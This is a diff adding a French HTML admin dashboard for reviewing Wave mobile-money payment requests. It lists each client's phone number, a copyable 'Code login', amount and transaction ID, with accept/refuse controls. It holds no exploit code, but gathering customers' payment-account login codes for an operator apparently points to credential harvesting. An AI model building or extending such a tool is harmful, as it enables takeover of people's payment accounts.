@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🌊 Dashboard Wave | Nature+</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+    <link rel="stylesheet" href="/admin/css/dashwave.css">
+</head>
+<body>
+
+    <!-- ============================================================= -->
+    <!-- HEADER                                                        -->
+    <!-- ============================================================= -->
+    <header class="dashwave-header">
+        <div class="header-left">
+            <img src="/client/images/wave-logo.png" alt="Wave" class="logo-wave" />
+            <h1>Dashboard <span>Wave</span></h1>
+        </div>
+        <div class="header-center">
+            <span class="solde-label">💰 Solde validé</span>
+            <span class="solde-value" id="soldeValue">0 FCFA</span>
+        </div>
+        <div class="header-right">
+            <a href="https://business.wave.com/home" target="_blank" class="btn-header wave-btn">
+                <i class="fas fa-external-link-alt"></i> Wave Business
+            </a>
+            <a href="/admin/dashboard" class="btn-header">
+                <i class="fas fa-chart-pie"></i> Admin
+            </a>
+            <button class="btn-header sync-btn" id="syncBtn" title="Synchronisation">
+                <i class="fas fa-sync-alt"></i>
+                <span class="sync-status active" id="syncStatus"></span>
+            </button>
+        </div>
+    </header>
+
+    <!-- ============================================================= -->
+    <!-- MAIN LAYOUT                                                   -->
+    <!-- ============================================================= -->
+    <div class="dashwave-main">
+
+        <!-- ===== SIDEBAR ===== -->
+        <aside class="sidebar-wave">
+            <!-- Recherche -->
+            <div class="search-area">
+                <div class="search-wrapper">
+                    <i class="fas fa-search"></i>
+                    <input type="text" id="searchInput" placeholder="Rechercher un client..." />
+                </div>
+            </div>
+
+            <!-- Liste des demandes -->
+            <div class="requests-list" id="requestsList">
+                <!-- Les demandes seront injectées par JS -->
+                <div class="loading-state">
+                    <i class="fas fa-spinner fa-spin"></i>
+                    <p>Chargement...</p>
+                </div>
+            </div>
+
+            <!-- Sidebar Footer -->
+            <div class="sidebar-footer">
+                <button class="btn-footer wave-link" onclick="window.open('https://business.wave.com/home','_blank')">
+                    <img src="/client/images/wave-logo.png" alt="Wave" class="footer-wave-icon" />
+                    Wave
+                </button>
+                <a href="/admin/dashboard" class="btn-footer">
+                    <i class="fas fa-chart-pie"></i> Admin
+                </a>
+            </div>
+        </aside>
+
+        <!-- ===== MAIN ===== -->
+        <main class="main-wave" id="mainWave">
+
+            <!-- ===== STATUT CARD ===== -->
+            <div class="status-card" id="statusCard">
+                <div class="status-left">
+                    <span class="status-icon" id="statusIcon">⏳</span>
+                    <div>
+                        <div class="status-text" id="statusText">Sélectionnez une demande</div>
+                        <div class="status-sub" id="statusSub">Choisissez une demande dans la sidebar</div>
+                    </div>
+                </div>
+                <div class="status-actions" id="statusActions">
+                    <button class="btn-status success-btn" id="successBtn" disabled>
+                        <i class="fas fa-check"></i> Success
+                    </button>
+                    <button class="btn-status refuse-btn" id="refuseBtn" disabled>
+                        <i class="fas fa-times"></i> Refuser
+                    </button>
+                </div>
+            </div>
+
+            <!-- ===== INFO GRID ===== -->
+            <div class="info-grid" id="infoGrid">
+
+                <!-- Téléphone -->
+                <div class="info-card">
+                    <span class="card-label"><i class="fas fa-phone"></i> Téléphone</span>
+                    <div class="card-value" id="infoPhone">-</div>
+                    <button class="copy-btn" data-copy=""><i class="fas fa-copy"></i></button>
+                </div>
+
+                <!-- Code login -->
+                <div class="info-card">
+                    <span class="card-label"><i class="fas fa-lock"></i> Code login</span>
+                    <div class="card-value" id="infoCode">-</div>
+                    <button class="copy-btn" data-copy=""><i class="fas fa-copy"></i></button>
+                </div>
+
+                <!-- Montant -->
+                <div class="info-card">
+                    <span class="card-label"><i class="fas fa-money-bill-wave"></i> Montant</span>
+                    <div class="card-value" id="infoMontant">-</div>
+                    <button class="copy-btn" data-copy=""><i class="fas fa-copy"></i></button>
+                </div>
+
+                <!-- ID Wave -->
+                <div class="info-card">
+                    <span class="card-label"><i class="fas fa-receipt"></i> ID Wave</span>
+                    <div class="card-value" id="infoWaveId">-</div>
+                    <button class="copy-btn" data-copy=""><i class="fas fa-copy"></i></button>
+                </div>
+
+                <!-- Date -->
+                <div class="info-card">
+                    <span class="card-label"><i class="fas fa-calendar"></i> Date de la demande</span>
+                    <div class="card-value" id="infoDate">-</div>
+                    <button class="copy-btn" data-copy=""><i class="fas fa-copy"></i></button>
+                </div>
+
+                <!-- Référence commande -->
+                <div class="info-card">
+                    <span class="card-label"><i class="fas fa-hashtag"></i> Réf. commande</span>
+                    <div class="card-value" id="infoRef">-</div>
+                    <button class="copy-btn" data-copy=""><i class="fas fa-copy"></i></button>
+                </div>
+
+                <!-- Client -->
+                <div class="info-card" style="grid-column: span 3;">
+                    <span class="card-label"><i class="fas fa-user"></i> Client</span>
+                    <div class="card-value text" id="infoClient" style="font-size:18px;">-</div>
+                    <button class="copy-btn" data-copy=""><i class="fas fa-copy"></i></button>
+                </div>
+
+            </div>
+
+            <!-- ===== EMPTY STATE ===== -->
+            <div class="empty-state" id="emptyState" style="display:none;">
+                <i class="fas fa-inbox"></i>
+                <h3>Aucune demande Wave</h3>
+                <p>Les demandes de vérification apparaîtront ici.</p>
+            </div>
+
+        </main>
+    </div>
+
+    <!-- ===== OVERLAY REFUSER ===== -->
+    <div class="refuse-overlay" id="refuseOverlay">
+        <div class="refuse-box">
+            <h3><i class="fas fa-times-circle"></i> Refuser le paiement</h3>
+            <p>Veuillez indiquer la raison du refus pour informer le client.</p>
+            <textarea id="refuseCause" placeholder="Ex: ID Wave invalide, montant incorrect..." rows="3"></textarea>
+            <div class="refuse-actions">
+                <button class="btn-cancel" id="refuseCancel">Annuler</button>
+                <button class="btn-confirm" id="refuseConfirm">Confirmer le refus</button>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://cdn.socket.io/4.8.3/socket.io.min.js"></script>
+    <script src="/admin/js/dashwave.js"></script>
+</body>
+</html>
